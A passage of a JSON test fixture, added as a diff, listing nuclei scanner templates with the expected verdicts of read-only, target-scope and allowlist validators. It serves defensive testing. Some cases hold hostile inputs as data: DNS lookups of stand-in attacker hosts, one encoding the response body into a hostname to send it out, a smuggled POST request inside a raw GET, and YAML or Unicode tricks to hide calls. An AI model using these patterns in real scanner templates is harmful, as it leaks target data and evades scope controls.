@@ -1,0 +1,859 @@
+{
+  "description": "AI-written or installed nuclei templates and the verdicts of the read-only check (cvENGINE validation.readonly_problem, cvengine_scanner.checks.readonly_problem) and of the own-target-and-port rule (checks.scope_problem). Both sides test against this file. \"sentinel\" is the verdict of the whole rule a Sentinel other than the built-in scanner applies (checks.check_problem, with the allowlist of cvengine_scanner.check_allowlist; the server: ai_checks.external_problem with cveFeed.check_allowlist).",
+  "cases": [
+    {
+      "name": "plain_get",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: word\n        words: [\"marker-1.2.3\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "head_and_options",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: HEAD\n    path: [\"{{BaseURL}}\"]\n  - method: OPTIONS\n    path: [\"{{BaseURL}}/a\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "raw_get_host_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /status HTTP/1.1\n        Host: {{Hostname}}\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "network_banner",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nnetwork:\n  - host:\n      - \"{{Hostname}}\"\n    matchers:\n      - type: word\n        words: [\"SSH-2.0-OpenSSH_7.2\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "network_host_port_placeholder",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\ntcp:\n  - host:\n      - \"{{Host}}:{{Port}}\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "ssl_default_address",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nssl:\n  - address: \"{{Host}}:{{Port}}\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "dns_fqdn",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\ndns:\n  - name: \"{{FQDN}}\"\n    type: A\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "same_host_redirects",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    host-redirects: true\n    max-redirects: 2\n    path: [\"{{BaseURL}}/\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "network_literal_port",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nnetwork:\n  - host:\n      - \"{{Hostname}}:22\"\n",
+      "read_only": true,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "network_port_key",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nnetwork:\n  - host:\n      - \"{{Hostname}}\"\n    port: 22\n",
+      "read_only": true,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "post_method",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: POST\n    path: [\"{{BaseURL}}/login\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "raw_put",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        PUT /x HTTP/1.1\n        Host: {{Hostname}}\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "body",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    body: \"a=b\"\n    path: [\"{{BaseURL}}/\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "payloads",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/{{p}}\"]\n    payloads:\n      p: [\"a\", \"b\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "fuzzing",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/\"]\n    fuzzing:\n      - part: query\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "out_of_band",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/?u={{interactsh-url}}\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "code_protocol",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\ncode:\n  - engine: [sh]\n    source: id\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "javascript_protocol",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\njavascript:\n  - code: \"1\"\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "headless_protocol",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nheadless:\n  - steps: []\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "file_protocol",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nfile:\n  - extensions: [all]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "workflows",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nworkflows:\n  - template: x.yaml\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "flow",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nflow: http(1)\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: word\n        words: [\"marker-1.2.3\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "absolute_url",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"http://other.example.com/x\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "base_url_then_host",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}@other.example.com/\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "raw_absolute_url",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET http://other.example.com/ HTTP/1.1\n        Host: {{Hostname}}\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "raw_other_host_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET / HTTP/1.1\n        Host: other.example.com\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "network_other_host",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nnetwork:\n  - host:\n      - \"other.example.com:22\"\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "network_sends_data",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nnetwork:\n  - host:\n      - \"{{Hostname}}\"\n    inputs:\n      - data: \"HELO\\r\\n\"\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "ssl_other_address",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nssl:\n  - address: \"other.example.com:443\"\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "dns_other_name",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\ndns:\n  - name: \"other.example.com\"\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "redirects_off_host",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    redirects: true\n    path: [\"{{BaseURL}}/\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "variables_override_target",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nvariables:\n  BaseURL: \"http://other.example.com\"\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: word\n        words: [\"marker-1.2.3\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "unknown_variable",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/{{secret}}\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "unknown_top_key",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\npre-condition: x\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: word\n        words: [\"marker-1.2.3\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "no_protocol",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "anchor_alias",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: &p [\"{{BaseURL}}/\"]\n  - method: GET\n    path: *p\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "not_yaml",
+      "template": "id: [unclosed\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "not_a_mapping",
+      "template": "- a\n- b\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "too_many_requests",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/1\", \"{{BaseURL}}/2\", \"{{BaseURL}}/3\", \"{{BaseURL}}/4\", \"{{BaseURL}}/5\", \"{{BaseURL}}/6\", \"{{BaseURL}}/7\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "cookie_reuse",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    cookie-reuse: true\n    path: [\"{{BaseURL}}/\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "unsafe",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - unsafe: true\n    raw:\n      - |\n        GET / HTTP/1.1\n        Host: {{Hostname}}\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "malformed_http",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp: \"GET /\"\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "helpers_on_the_allowlist",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-Probe: \"{{to_lower('Marker')}}\"\n    matchers:\n      - type: dsl\n        dsl:\n          - \"contains(to_lower(body), 'marker-1.2.3') && status_code == 200\"\n    extractors:\n      - type: dsl\n        dsl: [\"len(body)\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "raw_get_host_and_plain_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /status HTTP/1.1\n        Host: {{Hostname}}\n        Accept: text/html\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "resolve_in_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-A: \"{{resolve('x.attacker.example','a')}}\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "resolve_in_dsl_matcher",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: dsl\n        dsl:\n          - \"resolve('x.attacker.example','a') != ''\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "resolve_in_dsl_extractor",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    extractors:\n      - type: dsl\n        dsl:\n          - \"resolve(concat(hex_encode(body), '.attacker.example'),'a')\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "resolve_in_variable",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nvariables:\n  v: \"{{resolve('x.attacker.example','a')}}\"\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-V: \"{{v}}\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "resolve_bare_in_variable",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nvariables:\n  v: \"resolve('x.attacker.example','a')\"\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-V: \"{{v}}\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "resolve_in_word_matcher",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: word\n        words:\n          - \"{{resolve('x.attacker.example','a')}}\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "resolve_in_path",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/{{resolve('x.attacker.example','a')}}\"\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "resolve_in_raw",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /x HTTP/1.1\n        Host: {{Hostname}}\n        X-A: {{resolve('x.attacker.example','a')}}\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "resolve_nested_in_allowed_helper",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-A: \"{{to_lower(concat('a', resolve('x.attacker.example','a')))}}\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "resolve_in_info",
+      "template": "id: c\ninfo:\n  name: \"{{resolve('x.attacker.example','a')}}\"\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "jarm_in_dsl",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: dsl\n        dsl:\n          - \"jarm('192.0.2.1:443') != ''\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "wait_for_in_dsl",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: dsl\n        dsl:\n          - \"wait_for(30) && true\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "public_ip_in_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-A: \"{{public_ip()}}\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "print_debug_in_dsl",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: dsl\n        dsl:\n          - \"print_debug(body)\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "unix_time_in_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-A: \"{{unix_time()}}\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "rand_base_in_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-A: \"{{rand_base(99999999)}}\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "unknown_helper_in_dsl",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: dsl\n        dsl:\n          - \"future_helper(body)\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "member_access_in_dsl",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: dsl\n        dsl:\n          - \"body.Len() > 0\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "interactsh_name_in_dsl",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: dsl\n        dsl:\n          - \"contains(interactsh_protocol, 'dns')\"\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "section_sign_marker",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-A: \"\u00a7resolve('x.attacker.example','a')\u00a7\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "unclosed_expression",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-A: \"{{resolve\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "expression_split_by_yaml_folding",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-A: \"{{reso\\\n        lve('x.attacker.example','a')}}\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "expression_split_in_folded_block",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    matchers:\n      - type: dsl\n        dsl:\n          - >-\n            resolve('x.attacker.example',\n            'a') != ''\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "anchor_and_alias_for_a_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nvariables:\n  v: &h \"x\"\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    headers:\n      X-A: *h\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "merge_key",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - <<: {method: GET}\n    path: [\"{{BaseURL}}/x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "second_document",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n---\nid: d\ninfo:\n  name: d\n  severity: info\nhttp:\n  - method: POST\n    path: [\"{{BaseURL}}/x\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "document_end_then_more",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n...\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "duplicate_method_key",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: POST\n    method: GET\n    path: [\"{{BaseURL}}/x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "duplicate_top_key",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/y\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "explicit_tag",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: !!str GET\n    path: [\"{{BaseURL}}/x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "yaml_directive",
+      "template": "%YAML 1.1\n---\nid: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "yaml11_word_value",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    host-redirects: on\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "yaml11_octal_value",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    max-redirects: 03\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "unicode_lookalike_key",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    b\u043edy: \"x=1\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "unicode_line_separator",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-A: \"a\u2028b\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "case_variant_key",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - Method: POST\n    path: [\"{{BaseURL}}/x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "unknown_block_key",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    disable-path-automerge: true\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "json_extractor",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    extractors:\n      - type: json\n        json: [\"$ENV.HOME\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "raw_get_with_body",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /x HTTP/1.1\n        Host: {{Hostname}}\n        Content-Length: 30\n        \n        POST /admin/delete HTTP/1.1\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "raw_two_requests",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /x HTTP/1.1\n        Host: {{Hostname}}\n        POST /admin/delete HTTP/1.1\n        Host: {{Hostname}}\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "raw_at_host_annotation",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        @Host: https://192.0.2.1:443\n        GET /x HTTP/1.1\n        Host: {{Hostname}}\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "raw_annotation_after_request_line",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /x HTTP/1.1\n        @tls-sni: other.example\n        Host: {{Hostname}}\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "raw_host_literal_port",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /x HTTP/1.1\n        Host: {{Hostname}}:8080\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "raw_transfer_encoding",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /x HTTP/1.1\n        Host: {{Hostname}}\n        Transfer-Encoding: chunked\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "raw_cookie",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /x HTTP/1.1\n        Host: {{Hostname}}\n        Cookie: session=abc\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "raw_http2",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /x HTTP/2\n        Host: {{Hostname}}\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "host_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      Host: internal.corp.local\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "authorization_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      Authorization: \"Basic YWRtaW46YWRtaW4=\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "cookie_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      Cookie: \"sid=1\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "api_key_header_name",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-Api-Key: \"abc\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "credential_value_in_plain_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-Custom: \"Bearer abcdef\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "jwt_value_in_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-Custom: \"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "x_forwarded_for_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-Forwarded-For: \"127.0.0.1\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "method_override_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/x\"\n    headers:\n      X-HTTP-Method-Override: \"DELETE\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "lowercase_method",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: get\n    path: [\"{{BaseURL}}/x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "raw_get_with_body_no_length",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /x HTTP/1.1\n        Host: {{Hostname}}\n\n        POST /admin/delete HTTP/1.1\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "q_mixed_quote_dsl",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: dsl\n        dsl:\n          - \"contains(body, 'a\\\"+resolve(\\\"x.evil.example\\\",\\\"a\\\")+\\\"')\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "q_mixed_quote_header",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    headers:\n      X-A: \"{{concat('a\\\"+resolve(\\\"x.evil.example\\\",\\\"a\\\")+\\\"','')}}\"\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "q_mixed_quote_variable",
